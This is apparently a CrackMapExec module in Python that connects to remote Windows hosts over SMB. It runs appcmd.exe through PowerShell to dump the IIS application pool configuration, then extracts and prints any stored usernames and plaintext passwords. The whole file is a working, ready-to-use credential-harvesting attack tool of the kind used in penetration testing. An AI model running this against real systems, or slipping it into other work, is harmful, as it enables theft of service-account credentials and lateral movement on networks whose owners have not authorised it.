#!/usr/bin/env python3
# -*- coding: utf-8 -*-
class CMEModule:

    """
    Checks for credentials in IIS Application Pool configuration files using appcmd.exe.

    Module by Brandon Fisher @shad0wcntr0ller
    """

    name = 'appcmd'
    description = "Checks for credentials in IIS Application Pool configuration files using appcmd.exe"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        pass

    def options(self, context, module_options):
        pass

    def on_login(self, context, connection):
        self.check_appcmd(context, connection)

    def on_admin_login(self, context, connection):
        self.check_appcmd(context, connection)

    def check_appcmd(self, context, connection):
        
        if not hasattr(connection, 'has_run'):
            connection.has_run = False

        
        if connection.has_run:
            return

        connection.has_run = True

        
        try:
            connection.conn.listPath('C$', '\\Windows\\System32\\inetsrv\\appcmd.exe')
            self.execute_appcmd(context, connection)
        except:
            context.log.error("appcmd.exe not found, this module is not applicable.")
            return

    def execute_appcmd(self, context, connection):
        command = f'powershell -c "C:\\windows\\system32\\inetsrv\\appcmd.exe list apppool /@t:*"'
        context.log.info(f'Checking For Hidden Credentials With Appcmd.exe')
        output = connection.execute(command, True)

        
        lines = output.splitlines()
        username = ""
        password = ""

        
        credentials_set = set()

        for line in lines:
            if "userName:" in line:
                username = line.split("userName:")[1].strip().strip('"')
            if "password:" in line:
                password = line.split("password:")[1].strip().strip('"')

            if username and password:
                
                current_credentials = (username, password)

                if current_credentials not in credentials_set:
                    
                    credentials_set.add(current_credentials)

                    context.log.success(f"Credentials Found")
                    
                    context.log.highlight(f"Username: {username}, Password: {password}")

               
                username = ""
                password = ""

        if not credentials_set:
            context.log.error("No credentials found :( ")

        #context.log.success("Command executed successfully")

